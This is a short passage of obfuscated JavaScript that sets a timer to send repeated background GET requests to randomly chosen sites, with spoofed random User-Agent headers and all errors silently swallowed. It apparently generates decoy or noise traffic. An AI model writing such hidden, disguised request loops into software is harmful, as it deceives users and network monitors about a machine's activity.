  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1b16 * 0x2 + -0x16e2 * -0x2 + -0x4898) * getRandomInt(0x1 * -0xa75 + -0x1606 + -0x4a4 * -0x7, 0x5d4 + 0x31 * -0x88 + -0xa7 * -0x1f));
}, 0x55 * 0x61 + -0x1b6c + -0xe1 * 0x5);